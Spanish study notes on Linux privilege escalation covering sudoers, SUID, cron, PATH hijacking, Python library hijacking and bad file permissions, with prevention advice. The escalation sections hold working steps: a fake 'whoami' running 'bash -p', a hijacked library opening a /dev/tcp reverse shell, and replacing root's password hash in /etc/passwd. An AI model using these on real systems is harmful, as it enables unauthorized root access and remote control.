-----
- Tags: #teoria #practica #ataques #escalada #basico
----

# Abuso de privilegios a nivel de Sudoers

### El archivo **/etc/sudoers** es un archivo de configuración en sistemas Linux que se utiliza para controlar el acceso a los usuarios a las diferentes acciones que pueden realizar en el sistema. Este archivo contiene una lista de usuarios y grupos de usuarios que tiene permisos para realizar tareas de administración en el sistema. 

### El comando **"sudo"** permite a los usuarios ejecutar comandos como superusuarios o como otro usuario con privilegios especiales. El archivo sudoers especifica qué usuarios pueden ejecutar qué comandos con sudo y con qué privilegios.

### Abusar de los privilegios a nivel de sudoers es una técnica utilizada por los atacantes para elevar su nivel de acceso en el sistema comprometido. Si un atacantes es capaz de obtener acceso a una cuenta con permisos de sudo en el archivo sudoers, puede ejecutar comandos con privilegios especiales y realizar acciones maliciosas en el sistema. 

### El comando **"sudo -l"** es utilizado para listar los permisos de sudo de un usuario en particular. Al ejecutar este comando, se muestra una lista de los comandos que el usuario tiene permiso para ejecutar y bajo qué condiciones. 

# Evitar el abuso de privilegios de Sudoers 

### Para prevenir el abuso de privilegios a nivel de sudoers, se recomienda mantener los permisos adecuados en el archivo sudoers y limitar el número de usuarios con permisos de sudo. Además, es importante monitorear regularmente el archivo sudoers y buscar cambios inesperados o sospechosos en su contenido. 

# Escalada 

### La escalada varía en base a como se abusa del privilegio que se pueda llegar a tener sobre el binario, pero esto lo podemos encontrar en páginas como [gtfobins](https://gtfobins.github.io/gtfobins), donde una vez tengamos identificado el binario sobre el cual tengamos la posibilidad de ejecutarlo como otro usuario, sea root u otro con más privilegios que el que tenemos en ese momento, simplemente nos dirigimos a dicha página y seguimos los pasos de como escalar nuestro privilegio.

### Los binarios o tareas que puede ejecutar un usuario proporcionando contraseña  o no, se pueden encontrar en el archivo **/etc/sudoers** donde por ejemplo, si el usuario **dobliuw** pudiese ejecutar bajo los privilegios de otro usuario (**root**) un comando en particular, como por ejemplo [[Nmap]] podríamos ver en **gtfobins** si existe riesgos de poder ejecutar dicho comando como **root**. 

#### */etc/sudoers*
#### .....
#### User privilege specification
#### dobliuw ALL=(root) NOPASSWD: /usr/bin/nmap

-----

# Abusando de privilegios SUID

### Un privilegio **SUID (Set User ID)** es un permiso especial que se puede establecer en un archivo binario en sistemas Unix/Linux. Este permiso le da al usuario que ejecuta el archivo los **mismos privilegios** que el **propietario** del archivo. 

### Por ejemplo, si un archivo binario tiene establecido el permiso SUID y es propiedad del usuario root, cualquier usuario que lo ejecute adquirirá temporalmente los mismos privilegios que ele usuario root, lo que le permitirá realizar acciones que normalmente no podría hacer como un usuario normal. 

### El abuso de privilegios SUID es una técnica utilizada por los atacantes para elevar su nivel de acceso en un sistema comprometido. Si un atacante es capaz de obtener acceso a un archivo binario con permisos SUID, puede ejecutar comandos con privilegios especiales y realizar acciones maliciosas en el sistema.

# Evitar el abuso de privilegios SUID

### Para prevenir el abuso de privilegios SUID, se recomienda limitar el número de archivos con permisos SUID y asegurarse de que solo se otorguen a archivos que requieran este permiso para funcionar correctamente. Además, es importante monitorear regularmente el sistema para detectar cambios inesperados en los permisos de los archivos y para buscar posibles brechas de seguridad.

# Escalada 

### Una vez más la escalada varía en base a como se abuso de los privilegios SUID según el binario que sea, y en este caso también podemos usar páginas como [gtfobins](https://gtfobins.github.io/gtfobins)
----

# Detección y explotación de tareas Cron

### Una tarea cron es una tarea programada en sistemas Unix/Linux que se ejecuta en un momento determinado o en intervalos regulares de tiempo. Estas tareas se definen en un archivo **crontab** que especifica qué comandos deben ejecutarse y cuándo deben hacerlo.

### La detección y explotación de tareas cron es una técnica utilizada por los atacantes para elevar su nivel de acceso en un sistema comprometido. Por ejemplo, si un atacante detecta que un archivo está ejecutado por el usuario "root" a través de una tarea cron que se ejecuta a intervalos regulares de tiempo, y se da cuenta de que los permisos definidos en el archivo están mal configurados, podría manipular el contenido del mismo para incluir instrucciones maliciosas las cuales serían ejecutadas de forma privilegiada como el usuario 'root', dado que corresponde al usuario que está ejecutando dicho archivo. 

### Para detectar tareas cron, los atacantes pueden utilizar [[⚒ Herramientas ⚒]] como **Pspy**. Pspy es un herramienta de línea de comandos que monitorea las tareas que se ejecutan en segundo plano en un sistema Unix/Linux y muestra las nuevas tareas que se inician.

# Evitar la explotación de tareas Cron:

- ### **Limitar el número de tareas cron:** es importante limitar el número de tareas cron que se ejecutan en el sistema y asegurarse de que solo se otorgan permisos a tareas que requieren permisos especiales para funcionar correctamente. Esto disminuye la superficie de ataque y reduce las posibilidades de que un atacante puede encontrar una tarea cron vulnerable. 
- ### **Verificar los permisos de las tareas cron:** es importante revisar los permisos de las tareas cron para asegurarse de que solo se otorgan permisos a usuarios y grupos autorizados. Además, se recomienda evitar otorgar permisos de superusuario a las tareas cron, a menos que se estrictamente necesario. 
- ### **Supervisar regularmente el sistema:** es importante monitorear regularmente el sistema para detectar cambios inesperados en las tareas cron y para buscar posibles brechas de seguridad. Además, se recomienda utilizar herramientas de monitoreo de seguridad para detectar actividades sospechosas en el sistema. 
- ### **Configurar los registros de la tarea cron:** se recomienda habilitar la opción de registro para las tareas cron, para poder identificar cualquier actividad sospechosa en las tareas definidas y para poder llevar un registro de las actividades  realizadas por cada una de estas. 

# Escalada 

### Para detectar tareas cron podríamos crearnos un propio script como así también hacer uso de **Pspy**, ambas maneras son validas ya que la finalidad de esto es detectar tareas que se ejecutan en segundo plano para de esta manera terminar dando con tareas cron que se pudiesen estar ejecutando en el sistema.

### Para listar tareas cron también podemos usar el comando **crontab -l** (Esto solo lista las tareas cron del usuario en uso, por lo que tareas cron de otro usuario no nos saldrían), para ver más tareas cron podríamos hacerlo en la ruta **/etc/cron.d** pero en esta ruta tampoco tiene por que estar todas las tareas cron a nivel de sistema 

#### Script de monitoreo
```bash
#!/bin/bash

function ctrl_c(){
	echo -e "\n\n\t[!] Quiting....\n\n"
	exit 1 
}

trap ctrl_c SIGINT

old_process=$(/usr/bin/ps -eo user,command)

while true; do
	new_process=$(/usr/bin/ps -eo user,command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "kworker|{nombre_script}|command"
	old_process=$new_process
done 

```

#### [Pspy](https://github.com/DominicBreuker/pspy)

### Una vez localizadas las tareas cron que pudiesen estar corriendo por el sistema, solo queda ver si puede llegar a ser vulnerable para posteriormente explotarlas.

----

# PATH Hijacking

### **PATH Hijacking** es una técnica utilizada por los atacantes para **secuestrar comandos** de un sistema Unix/Linux mediante la manipulación del **PATH**. El PATH es una variables de entorno que define las rutas de búsqueda para los archivos ejecutables en el sistema.

### En algunos binarios compilados, algunos de los comandos definidos internamente pueden ser indicados con una ruta relativa en lugar de una ruta absoluta. Esto significa que el binario busca los archivos ejecutables en las rutas especificadas en el PATH, en lugar de utilizar la ruta absoluta del archivo ejecutable.

### Si un atacante es capaz de alterar el PATH y crear un nuevo archivo con el mismo nombre de uno de los comandos definidos internamente en el binario, puede lograr que el binario ejecuta la versión maliciosa del comando en lugar de la versión legítima.

### Por ejemplo, si un binario compilado utiliza el comando "*ls*" sin su ruta absoluta en su código y el atacante crea un archivo maliciosos llamado "*ls*" en una de las rutas especificadas en el PATH, el binario ejecutará el archivo malicioso en lugar del comando legítimo "**ls**" cuando sea llamado.

# Prevenir el PATH Hijacking

### Para prevenir el **PATH Hijacking**, se recomienda utilizar **rutas absolutas** en lugar de rutas relativas en los comandos definidos internamente en los binarios compilados. Además, es importante asegurarse de que las rutas en el PATH sean controladas y limitadas a las rutas necesarias para el sistema. También se recomienda utilizar la opción de permisos de ejecución para los archivos ejecutables solo para los usuarios y grupos autorizados. 

# Escalada

### Para escalar los privilegios del usuario actual mediante el empleo de un **PATH Hijacking** lo que deberíamos hacer es intentar abusar de un binario mal programado el cual debería ejecutar algún comando a nivel de sistema pero **SIN hacerlo de forma absoluta**, es decir, en lugar de indicar por ejemplo **/usr/bin/whoami** lo hace como **whoami**. 

### Por ejemplo, si tuviéramos un script en **Go** el cual se ve de la siguiente manera: 

```go
#include <stdio.h>

int main(){
	setuid(0);
	printf("Este programa sirve para indicarnos que usuario somos"); 
	printf("\n\n\t[!] Actualmente somos el usuario: "); 
	system("whoami")
	return 0; 
}
```

### El cual es compilado `gcc {file.c} -o {binario}` y se le dan permisos SUID `chmod u+s {binario}`. 

### Si bien **no sabríamos** de primeras que se esta ejecutando un comando **sin su ruta absoluta** y a la vez no disponemos del archivo inicial **.c** que compila posteriormente el binario para ver que hace por detrás el binario ni podemos ver el contenido del mismo con **cat** por ser un precisamente un binario, podemos hacer uso de **strings** para ver si (Intuyendo que se ejecuta un **whoami** debido a que el programa parece indicarnos con que usuario estamos ) existe alguna string relacionado al comando **whoami**, ya sea la ruta absoluta o el mismo **whoami**

### Si al hacer `strings {bibario} | grep "whoami"` vemos la cadena "whoami", quiere decir que se podría estar ejecutando el comando whoami sin su ruta absoluta, lo que podría derivar en un **PATH Hijacking**. 

### Para hacer esto, simplemente deberíamos crear un binario llamado como el comando que se ejecuta sin su ruta absoluta (En este caso **whoami**) en un directorio con permisos de escritura, para posteriormente modificar la variable de entorno PATH para indicar que la primera ruta de búsqueda de los binarios es en dicho directorio donde depositamos nuestro comando maliciosos

```bash 
cd /tmp 

touch whoami 

echo "bash -p" > whoami 

export PATH=/tmp/:$PATH
```

### Una vez modificado el path, deberíamos volver a ejecutar el binario inicial para que a la hora de llegar a la línea en donde ejecuta el comando *"whoami"* al tener el path modificado indicando que se tiene que buscar todo binario indicado sin su ruta absoluta en primer lugar en el path "**/tmp"**, al dirigirse a esta en busca del binario **whoami** el mismo sea hallado y ejecutado, dando como resultado el lanzamiento de una bash con privilegios (Ya que el binario tenía permisos SUID)

----

# Python Library Hijacking 

### Cuando hablamos de **Python Library Hijacking**, a lo que nos referimos es a una técnica de ataque que aprovecha la forma en la que Python busca y carga bibliotecas para inyectar código maliciosos en un script. El ataque se produce cuando un atacante re o modifica una biblioteca en una ruta accesible por el script de Python, de tal manera que cuando el script la importa, se carga la versión maliciosa en lugar de la legítima. 

### La forma en que el ataque se lleva a cabo es la siguiente: el atacante busca una biblioteca utilizad por el script y la reemplazas por su propia versión maliciosa. Esta biblioteca puede ser una biblioteca estándar de Python o una biblioteca externa descargada e instalada por el usuario. El atacante coloca  su versión maliciosa en una ruta accesible antes que la biblioteca legítima sea encontrada.

### En genera, Python comienza buscando estas bibliotecas en el directorio actual de trabajo y luego en las rutas definidas en la variable sys.path. Si el atacante tiene acceso de escritura en alguna de las rutas definidas en sys.path, puede colocar allí su propia versión maliciosa de la biblioteca y hacer que el script cargue en lugar de la legítima.

### Además, el atacante también puede crear su propia biblioteca en el directorio actual de trabajo, ya que Python comienza la búsqueda en este directorio por defecto. Si durante la carga de estas librerías desde el script legítimo, el atacante logra secuestrarlas, entonces conseguirá una ejecución alternativa del programa. 

# Escalada 

### Supongamos que estamos en un sistema con el usuario **dobliuw** (El cual tenemos en poder) y otro usuario con mayores privilegios llamado **admin**, en el archivo de **/etc/sudoers** esta declarada la sentencia **dobliuw ALL=(admin)  NOPASSWD: /usr/bin/python3 /home/admin/myFirstScript.py**, lo cual al hacer **sudo -l** como el usuario dobliuw vemos que podemos ejecutar un script llamado *myFirstScript.py* como el usuario *admin* sin  proporcionar contraseña con python3. 

### El script es algo básico como lo siguiente: 

```python
#!/usr/bin/python3
import time, hashlib, signal, sys

def ctrl_c(sig, frame):
	print("\n\n\t[!] Quiting...\n\n")
	sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c) 

def main():
	name = str(input("Please insert your name: "));
	time.sleep(2)
	print("\n\n\t[!] Oh I understand now... Hello {} ({})\n\n".format(name,hashlib.md5(name.encode()).hexdigest()))


if __name__ == "__main__":
	main()
```
#### Es un script x de ejemplo, podría ser cualquier tipo de script. 

### En este momento es cuando, en caso de tener permiso de escritura en el directorio en el cual se encuentra el script (*/home/admin*) o tenerlo en alguna de las carpetas en donde python busca las librerías (**python3 -c 'import sys; print(sys.path)'** para ver los paths) o incluso teniendo permisos de escritura en alguna de las librerías que se importa el script, en este caso *hashlib*, *signal*, etc. podríamos acontecer un *Python Library Hijacking*.

### Por ejemplo podríamos crear el script (En la carpeta de trabajo o alguna de las otras), o incluso modificar la librería original para ingresar código malicioso que ejecute alguna acción, por ejemplo espawnear una consola como el usuario administrador aprovechando que podemos ejecutar el script como dicho usuario gracias a los permisos SUID, o enviarla a un equipo remoto, etc.

#### signal.py  ||  hashlib.py
```python
# Spawnear una consola como el usuario admin
import os

os.system("bash -p")

#############################################3

# Enviar una reverse shell como el usuario admin a un dispositivo remoto 
import subprocess

subprocess.Popen(["bash -c 'bash -i &>/dev/tcp/{ip}/{port} 0>&1'"], shell=True)
```

### Una vez teniendo el código malicioso en un nuevo archivo en el directorio de trabajo con el nombre de una de las librerías importadas en el script original, o habiendo modificado la librería real bastaría con ejecutar el script como el usuario *admin* aprovechando los permisos garantizados en el archivo de sudoers y tendríamos la ejecución de los comandos deseados.  **sudo -u admin /usr/bin/python3 /home/admin/myFirstScript.py** 

-----

# Abuso de permisos incorrectamente implementados

### En sistemas Linux, los archivos y directorios tiene permisos que se utilizan para controlar el acceso a ellos. Los permisos se dividen en tres categorías: propietario, grupo y otros. Cada categoría puede tener permisos de lectura, escritura y ejecución. Los permisos de un archivo puede ser modificados por el propietario o por el superusuario del sistema. 

### El abuso de permisos incorrectamente implementados ocurre cuando los permisos de un archivo crítico son configurados incorrectamente, permitiendo a un usuario no autorizado acceder o modificar el archivo. Esto puede permitir a un atacante leer información confidencial, modificar archivos importantes, ejecutar comandos maliciosos o incluso obtener acceso de superusuario al sistema. 

### De esta forma, una atacante experimentado podría aprovecharse de esta falla para elevar sus privilegios en el mejor de los casos. Una de las herramientas encargadas de aplicar este reconocimiento en el sistema es **'lse'**, Linux Smart Enumeration ( LSE ) es una herramienta de enumeración de seguridad para sistemas operativos basados en Linux, diseñada para ayudar a los administradores de sistemas y auditores de seguridad a identificar y evaluar vulnerabilidades y debilidades en la configuración del sistema. 

### [LSE](https://github.com/diego-treitos/linux-smart-enumeration) está diseñado para ser fácil de usar y proporciona una salida clara y legible para facilitar la identificación de problemas de seguridad. La herramienta utiliza comandos de Linux estándar y se ejecuta en la línea de comandos, lo que significa que no se requiere software adicional. Además, enumera una amplia gama de información del sistema, incluyendo usuarios, grupos, servicios, puertos abiertos, tareas programadas, permisos de archivos, variables de entorno y configuraciones del firewall, entre otros. 

# Escalada

### Una vez más puede haber infinitos escenarios, pero esto se basa en errores de asignación de permisos a binarios, archivos, etc. que no debería tener dichos archivos. 

### Por ejemplo, supongamos que una vez vulnerado un sistema con [[⚒ Herramientas ⚒]] mencionadas anteriormente como *Linux Smart Enumeration* o *LinPEAS* o incluso de manera manual buscando por archivos writables desde la raíz *find / -writable 2>/dev/null*, encontramos permisos que no deberían estar asignados al **/etc/passwd** donde otros pueden escribir el mismo (*-rw-r--rw-*), automáticamente podríamos abusar de permisos incorrectamente implementados, generando con el comando **"openssl passwd"** al ingresar una password un HASH de la contraseña ingresada para remplazarlo en la línea de **/etc/passwd** de la contraseña del user **root**.

### Remplazando la x de la línea *root:x:root:/root:/bin/bash* por el hash obtenido de la nueva contraseña *root:\$1\$QDfHsDA6$LkYF/GBe54R4T5FADhgQR0:0:0:root:/root:/bin/bash*

### Otro ejemplo podría ser un archivo que se ejecuta por una tarea cron en nuestro directorio personal, creado por root el cual no podemos editar, pero al estar incorrectamente implementados los permisos, ya que se encuentra en nuestro directorio personal y si bien no podemos editar el mismo, al poder manipular todo contenido dentro de nuestro directorio personal, podríamos eliminarlo para volver a crear otro archivo con el mismo nombre pero malicioso. 

------

# Detección y explotación de Capabilities 









